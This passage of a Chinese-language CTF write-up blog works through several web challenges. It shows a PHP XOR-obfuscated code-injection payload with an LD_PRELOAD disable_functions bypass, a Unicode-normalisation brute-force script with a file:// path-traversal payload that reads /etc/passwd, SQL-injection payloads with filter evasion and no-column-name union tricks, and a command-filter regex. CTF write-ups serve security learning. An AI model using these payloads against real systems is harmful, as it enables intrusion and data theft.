异或<br><span class="hljs-comment">//$a=&#x27; </span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&quot;B&quot;</span>);        取反<br><span class="hljs-comment">//$a=%BB                由于取反结果是一个不可见的字符。所以我们通过URL编码输出。浏览器会自动解码。~&quot;B&quot;=~%BB</span><br><span class="hljs-comment">//不太明白为什么要用assert</span><br></code></pre></td></tr></table></figure><p><img src="/images/IUW8YX16KKFF6HS.png"><br>通过phpinfo()页面可知<br><img src="/images/I1AISR2SJBF6ZWJ4.png"><br>在phpinfo()页面可以发现禁用了非常多的函数，其中包括system、exec、shell_exec等关键执行函数<br>有shell了就连下蚁剑<br>连接发现根目录有flag，但是为空，还有一个readflag文件<br>这里可以发现readflag这个文件但是并没有执行权限，所以得绕过disable_function<br><a href="https://www.freebuf.com/articles/web/192052.html">巧用LD_PRELOAD突破disable_functions</a><br>通过文章可以了解到<br>导致 webshell 不能执行命令的原因大概有三类：一是 php.ini 中用 disable_functions 指示器禁用了 system()、exec() 等等这类命令执行的相关函数；二是 web 进程运行在 rbash 这类受限 shell 环境中；三是 WAF 拦劫。若是一则无法执行任何命令，若是二、三则可以执行少量命令。</p><p>有四种绕过 disable_functions 的手法：第一种，攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞；第二种，寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；第三种，mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制；第四种，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。</p><p>下载博主整理的源码<br>上传到蚁剑的var&#x2F;tmp目录下<br><img src="/images/IDZ3WZLUP4E34ZIGIN.png"><br>我们需要传入三个参数，第一个参数cmd为执行的命令，第二个参数outpath为输入出文件位置，第三个sopath参数为上传的so文件所在位置<br>payload:</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sas">?code=$&#123;<span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span>^<span class="hljs-title function_">%a1</span><span class="hljs-title function_">%b9</span><span class="hljs-title function_">%bb</span><span class="hljs-title function_">%aa</span>&#125;[_]($&#123;<span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span>^<span class="hljs-title function_">%a1</span><span class="hljs-title function_">%b9</span><span class="hljs-title function_">%bb</span><span class="hljs-title function_">%aa</span>&#125;[__]);<span class="hljs-variable">&amp;_</span>=assert<span class="hljs-variable">&amp;__</span>=include(%27/var/tmp/bypass_disablefunc.php%27)<span class="hljs-variable">&amp;cmd</span>=/readflag<span class="hljs-variable">&amp;outpath</span>=/tmp/tmpfile<span class="hljs-variable">&amp;sopath</span>=/var/tmp/bypass_disablefunc_x64.so<br>这里使用的是异或绕过%##为16进制格式,异或转化为下<br>?code=$&#123;_GET&#125;[_]($&#123;_GET&#125;[__]);<span class="hljs-variable">&amp;_</span>=assert<span class="hljs-variable">&amp;__</span>=include(%27/var/tmp/bypass_disablefunc.php%27)<span class="hljs-variable">&amp;cmd</span>=/readflag<span class="hljs-variable">&amp;outpath</span>=/tmp/tmpfile<span class="hljs-variable">&amp;sopath</span>=/var/tmp/bypass_disablefunc_x64.so<br>//其中$&#123;_GET&#125;[_]与$_GET[_]用法类似，但本题第二种方法试了没通过，可能是因为网络问题，没有测试很多次，十六进制数对应的字符尽量为不可见字符，不然会被浏览器编译，导致失败。。。<br></code></pre></td></tr></table></figure><p><img src="/images/FYRDD8A02HBUVNJJFWD.png"><br>至此以大功告成</p><h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p><img src="/images/NUADL8I15TFAOGUYBJE0V.png"><br>将题目给的代码整理一下</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@app</span>.<span class="hljs-built_in">route</span>(<span class="hljs-string">&#x27;/getUrl&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def <span class="hljs-built_in">getUrl</span>():<br>    url = request.args.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;url&quot;</span>)<br>    host = parse.<span class="hljs-built_in">urlparse</span>(url).hostname #获取域名ip 例：www.xxxx.com<br>    if host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        return <span class="hljs-string">&quot;我扌 your problem? 111&quot;</span><br>    parts = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">urlsplit</span>(url)) <br>    host = parts[<span class="hljs-number">1</span>]<br>    if host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        return <span class="hljs-string">&quot;我扌 your problem? 222 &quot;</span> + host<br>    newhost = []<br>    for h in host.<span class="hljs-built_in">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        newhost.<span class="hljs-built_in">append</span>(h.<span class="hljs-built_in">encode</span>(<span class="hljs-string">&#x27;idna&#x27;</span>).<span class="hljs-built_in">decode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-built_in">join</span>(newhost)<br>    #去掉 url 中的空格<br>    finalUrl = <span class="hljs-built_in">urlunsplit</span>(parts).<span class="hljs-built_in">split</span>(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>]<br>    host = parse.<span class="hljs-built_in">urlparse</span>(finalUrl).hostname<br>    if host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        return urllib.request.<span class="hljs-built_in">urlopen</span>(finalUrl).<span class="hljs-built_in">read</span>()<br>    <span class="hljs-attribute">else</span>:<br>        return <span class="hljs-string">&quot;我扌 your problem? 333&quot;</span><br></code></pre></td></tr></table></figure><p>这道题用的是blackhat议题之一HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization<br>nginx配置文件路径 black hat一个议题 任意读取文件<br><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">原链接在这</a><br>先来分析代码<br>对几个函数进行解释<br>urlsplit(url)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">url = <span class="hljs-string">&quot;https://username:password@www.baidu.com:80/index.html;parameters?name=tom#example&quot;</span><br><br><span class="hljs-built_in">print</span>(urlsplit(url))<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">SplitResult(</span><br><span class="hljs-string">    scheme=&#x27;https&#x27;, </span><br><span class="hljs-string">    netloc=&#x27;username:password@www.baidu.com:80&#x27;, </span><br><span class="hljs-string">    path=&#x27;/index.html;parameters&#x27;, </span><br><span class="hljs-string">    query=&#x27;name=tom&#x27;, </span><br><span class="hljs-string">    fragment=&#x27;example&#x27;)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host<span class="hljs-selector-class">.split</span>(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        newhost<span class="hljs-selector-class">.append</span>(h<span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&#x27;idna&#x27;</span>)<span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure><p>对字符串 host 进行了拆分（split）操作，然后对每个分割后的子字符串进行了IDNA编码和UTF-8解码，最终将结果添加到名为 newhost 的列表中。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">return urllib<span class="hljs-selector-class">.request</span><span class="hljs-selector-class">.urlopen</span>(finalUrl)<span class="hljs-selector-class">.read</span>()<br></code></pre></td></tr></table></figure><p>使用了 urllib.request.urlopen 函数来打开指定的URL（finalUrl），并调用 read() 方法读取该URL返回的数据。</p><p>改一下代码，整体运行一下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> urllib import parse<br><span class="hljs-keyword">from</span> urllib.parse import urlsplit, urlparse, urlunsplit<br><br><span class="hljs-comment">#@app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><br>    # url = request.args.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;url&quot;</span>)<br>url = <span class="hljs-string">&quot;http://suctf.cX&quot;</span><br>host = parse.urlparse(url).hostname #获取域名ip例：www.xxxx.com<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;host1= &#x27;</span> +host)<br><span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;我扌 your problem? 111&quot;</span>)<br>parts = list(urlsplit(url))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;parts = &#x27;</span>,parts)<br>host = parts[1]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;host2= &#x27;</span> +host)<br><span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;我扌 your problem? 222&quot;</span>)<br>newhost = []<br><span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">&#x27;.&#x27;</span>):<br>    newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>parts[1] = <span class="hljs-string">&#x27;.&#x27;</span>.join(newhost)<br><span class="hljs-comment">#去掉 url 中的空格</span><br>finalUrl = urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[0]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;finalUrl = &#x27;</span> + finalUrl)<br>host = parse.urlparse(finalUrl).hostname<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;host3= &#x27;</span> +host)<br><span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;yes&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;我扌 your problem? 444&quot;</span>)<br><br><br><span class="hljs-comment">#host1= suctf.cx</span><br><span class="hljs-comment">#parts =  [&#x27;http&#x27;, &#x27;suctf.cX&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;&#x27;]</span><br><span class="hljs-comment">#host2= suctf.cX</span><br><span class="hljs-comment">#finalUrl = http://suctf.cX</span><br><span class="hljs-comment">#host3= suctf.cx</span><br><span class="hljs-comment">#我扌 your problem? 444</span><br></code></pre></td></tr></table></figure><p>从代码上看，我们需要提交一个url，用来读取服务器文件<br>需要绕过前两个if，进入第三个if来使用函数<br>而三个if中判断条件都是相同的，不过在此之前的host构造却是不同的，这也是blackhat该议题中想要说明的一点<br>当URL 中出现一些特殊字符的时候，输出的结果可能不在预期<br>这里需要按照getUrl函数写出爆破脚本即可得到构造语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse,urlunsplit,urlsplit<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_unicode</span>():<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">65536</span>):<br>        uni=<span class="hljs-built_in">chr</span>(x)<br>        url=<span class="hljs-string">&quot;http://suctf.c&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(uni)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> getUrl(url):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;str: &quot;</span>+uni+<span class="hljs-string">&#x27; unicode: \\u&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(x))[<span class="hljs-number">2</span>:])<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getUrl</span>(<span class="hljs-params">url</span>):<br>    url=url<br>    host=parse.urlparse(url).hostname<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    parts=<span class="hljs-built_in">list</span>(urlsplit(url))<br>    host=parts[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    newhost=[]<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    parts[<span class="hljs-number">1</span>]=<span class="hljs-string">&#x27;.&#x27;</span>.join(newhost)<br>    finalUrl=urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>]<br>    host=parse.urlparse(finalUrl).hostname<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br> <br> <br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    get_unicode()<br><br></code></pre></td></tr></table></figure><p><img src="/images/I1L8OCMS423Q6WG591.png"></p><p>我们只需要让其中的一个去读取文件即可，需要url编码一下<br>先读一下etc&#x2F;passwd<br>payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/getUrl?url=file:/</span><span class="hljs-regexp">/suctf.c%E2%84%82/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br></code></pre></td></tr></table></figure><p><img src="/images/AZEKDNX7SKH3FWH78.png"><br>部分nginx的配置文件所在位置</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">配置文件： <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>conf/nginx.conf<br>配置文件存放目录：<span class="hljs-regexp">/etc/</span>nginx<br>主配置文件：<span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/conf/</span>nginx.conf<br>管理脚本：<span class="hljs-regexp">/usr/</span>lib64<span class="hljs-regexp">/systemd/</span>system/nginx.service<br>模块：<span class="hljs-regexp">/usr/</span>lisb64<span class="hljs-regexp">/nginx/m</span>odules<br>应用程序：<span class="hljs-regexp">/usr/</span>sbin/nginx<br>程序默认存放位置：<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nginx/</span>html<br>日志默认存放位置：<span class="hljs-regexp">/var/</span>log/nginx<br></code></pre></td></tr></table></figure><p>挨个读读试试<br>在配置文件中我们发现<br><img src="/images/JEBYS4JSYT3P6T3.png"><br>读取<br><img src="/images/RENLJ0UVWDRW3HCA4.png"></p><h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>登录页面，有注册先注册<br>这里admin被注册了，注册一个admin1，登录<br><img src="/images/EIMTIHG6GCW38WPEIR.png"><br>疑似注入点，万能钥匙测测<br><img src="/images/JVEITI0I8S3UWTV.png"><br>存在过滤，再测测<br>一番测试以后，发现过滤了or,#,–+和空格</p><ul><li><p>空格被过滤<br>可以用&#x2F;**&#x2F;代替空格</p></li><li><p>注释符被过滤<br>将后面的单引号闭合即可</p></li><li><p>or被过滤<br>导致 order by 、information_schema都不能用。<br>于是查表名可以使用select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database()</p></li></ul><p>先判断列数<br>因为or被禁 order by无法用，所以用group by ，一样的效果<br>payload</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">group</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">by</span><span class="hljs-comment">/**/</span><span class="hljs-number">23</span>,<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/images/80730O6C28XTPBO8R9.png"><br>判断为22列<br>回显位</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;union/**/select/**/<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>&#x27;<br></code></pre></td></tr></table></figure><p>回显位为2，3</p><p>爆数据库</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;/**/union/**/select/**/<span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/7P3H0XHID45SU1M592.png"></p><p>爆表</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;union/**/select/**/<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=<span class="hljs-string">&quot;web1&quot;</span>&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/BOGXTMWDKOVT3N28.png"></p><p>因为关键字被禁，所以我们不能直接爆字段，我们可以绕过这一步骤直接通过表来爆值<br>学习到了一个新的概念：使用无列名注入技巧获取字段值<br>无列名注入</p><ol><li><p>如果information_schema被WAF,得到表名之后使用无列名注入技巧获取字段值.<br><img src="/images/2016410-20200519163717474-1767458536.png"></p></li><li><p>之后就可以利用数字来对应相应的列,进行查询<br><img src="/images/2016410-20200519164320071-1957869897.png"></p></li></ol><p> 这里有两点需要注意一下:</p><p>1.列名需要用&#96;&#96;包裹起来<br>2.使用子查询的时候,即一个查询嵌套在另一个查询中,内层查询的结果可以作为外层查询的条件,内层查询到的结果需要起一个别名(as)</p><ol start="3"><li>如果反引号&#96;&#96;被过滤,可以使用为字段起别名的方式.<br><img src="/images/2016410-20200519164947664-637568242.png"><br>现在的思路就明朗了<br>payload<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;/**/union/**/select/**/<span class="hljs-number">1</span>,database(),(select/**/group_concat(`<span class="hljs-number">3</span>`)/**/from/**/(select/**/<span class="hljs-number">1</span>,<span class="hljs-number">2</span>/**/as/**/a,<span class="hljs-number">3</span>/**/union/**/select/**/*/**/from/**/users)heihei),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>&#x27;<br></code></pre></td></tr></table></figure></li></ol><p>代码解析</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">group_concat</span><span class="hljs-params">(`<span class="hljs-number">3</span>`)</span></span><br></code></pre></td></tr></table></figure><p>上面表示列为3</p><p>heiheihei表示派生表的别名，名字随意<br><img src="/images/I1B1KP1JAETRBPE9A.png"><br><a href="https://blog.csdn.net/m0_46230316/article/details/106668182">无列名注入总结</a></p><h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>题目说要以 JSON 格式输入命令<br>而JSON 需要给一个键值对<br>格式为</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;heiheihei&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>先输入</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ls&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/images/JOG2DW2SH1II1WFM.png"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ls /&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>没有回显，错误<br>尝试使用{“cmd”:”cat index.php”} , 返回: Hacking attempt detected 估计过滤了cat 。<br>dirsearch什么都没扫出来<br>看了看大佬的wp，这题应该是会给源代码的</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&lt;?php<br><br>putenv(&#x27;PATH=/home/rceservice/jail&#x27;);<br><br><span class="hljs-keyword">if</span> (isset($_REQUEST<span class="hljs-literal">[&#x27;<span class="hljs-identifier">cmd</span>&#x27;]</span>)) &#123;<br>  $json = $_REQUEST<span class="hljs-literal">[&#x27;<span class="hljs-identifier">cmd</span>&#x27;]</span>;<br><br>  <span class="hljs-keyword">if</span> (!is<span class="hljs-constructor">_string($<span class="hljs-params">json</span>)</span>) &#123;<br>    echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;<br>  &#125; elseif (preg<span class="hljs-constructor">_match(&#x27;<span class="hljs-operator">/</span>^.<span class="hljs-operator">*</span>(<span class="hljs-params">alias</span>|<span class="hljs-params">bg</span>|<span class="hljs-params">bind</span>|<span class="hljs-params">break</span>|<span class="hljs-params">builtin</span>|<span class="hljs-params">case</span>|<span class="hljs-params">cd</span>|<span class="hljs-params">command</span>|<span class="hljs-params">compgen</span>|<span class="hljs-params">complete</span>|<span class="hljs-params">continue</span>|<span class="hljs-params">declare</span>|<span class="hljs-params">dirs</span>|<span class="hljs-params">disown</span>|<span class="hljs-params">echo</span>|<span class="hljs-params">enable</span>|<span class="hljs-params">eval</span>|<span class="hljs-params">exec</span>|<span class="hljs-params">exit</span>|<span class="hljs-params">export</span>|<span class="hljs-params">fc</span>|<span class="hljs-params">fg</span>|<span class="hljs-params">getopts</span>|<span class="hljs-params">hash</span>|<span class="hljs-params">help</span>|<span class="hljs-params">history</span>|<span class="hljs-params">if</span>|<span class="hljs-params">jobs</span>|<span class="hljs-params">kill</span>|<span class="hljs-params">let</span>|<span class="hljs-params">local</span>|<span class="hljs-params">logout</span>|<span class="hljs-params">popd</span>|<span class="hljs-params">printf</span>|<span class="hljs-params">pushd</span>|<span class="hljs-params">pwd</span>|<span class="hljs-params">read</span>|<span class="hljs-params">readonly</span>|<span class="hljs-params">return</span>|<span class="hljs-params">set</span>|<span class="hljs-params">shift</span>|<span class="hljs-params">shopt</span>|<span 